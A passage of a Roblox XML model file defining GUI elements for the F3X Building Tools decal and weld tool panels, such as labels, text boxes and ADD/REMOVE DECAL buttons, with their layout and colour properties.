												<XO>7</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-7</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX017D0BD1CACF42648297837E8B6463C8">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ImageIDOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX889DFE6493D64F57AA5ABE92D2FFD76D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Image ID</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX5ED29E4F12924040B109EB358CF7B787">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TextBoxBorder</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>61</XO>
											<YS>0</YS>
											<YO>17</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>85</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX193D1FEEED5E4C53A23375573BF09182">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">BottomBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>-1</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>1</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX0274AAEDEF274EB49179EF39C6E5359A">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">LeftBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>1</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXF1A693BCF3214173A5251A5DC189950E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283760767</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">RightBorder</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>1</XS>
												<XO>-1</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>1</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX929688AE35E848E9AF5717AAC9B358AF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283760767</Color3>
										<float name="BackgroundTransparency">0.899999976</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">TextBoxBackground</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>-2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>86</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX3CC0D9C45ED644F098379C0881F408BE">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">3</token>
										<token name="FontSize">5</token>
										<bool name="Modal">false</bool>
										<string name="Name">TextButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>65</XO>
											<YS>0</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>18</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4279970357</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
								<Item class="TextBox" referent="RBX6F79A178A3DB4961AE71728055D15827">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283760767</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClearTextOnFocus">true</bool>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">4</token>
										<token name="FontSize">6</token>
										<bool name="MultiLine">false</bool>
										<string name="Name">TextBox</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>65</XO>
											<YS>0</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<bool name="ShowNativeInput">true</bool>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>80</XO>
											<YS>0</YS>
											<YO>18</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text"></string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">true</bool>
										<float name="TextSize">18</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXC6C8481183384E6D9E5C54735D01AAED">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">AddButton</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBXFF6A7CC9EE294EED8B8AAAC7A4AAC712">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.449999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Button</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">ADD DECAL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.800000012</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX4CCBB7DC436046EAB27BA58802E8A0BC">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.300000012</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX9F6E0CC6653045F9B021CC70405D2E57">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">RemoveButton</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>10</XO>
										<YS>1</YS>
										<YO>-35</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-10</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextButton" referent="RBX82A738897AFB4847AE2DAAD50633A3C1">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.449999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">Button</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">REMOVE DECAL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.800000012</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXCA1A721D7BD94D73AB3FC75F8E11AD96">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.300000012</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">2</int>
									</Properties>
								</Item>
							</Item>
							<Item class="TextLabel" referent="RBXADE222ADCE6246629DEBCF34D011E54F">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">2</token>
									<token name="FontSize">3</token>
									<string name="Name">Text</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>6</XO>
										<YS>1</YS>
										<YO>2</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-6</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text">TIP: Select a part &amp; right click on a surface</string>
									<Color3 name="TextColor3">4294967295</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">11</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">0.5</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">true</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX9F276B6C40EE45308BF20799A9F7B2C9">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTWeldToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>280</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>220</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXC5D2CD74D1864F22ACFCB01574FB8028">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXE5E77D25B4F040B486D75248B85DEB35">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXDAD7208B9F87494BB3C70AD6EF84B8F0">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">WELD TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX211A449E74024684A032775E9622EB90">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
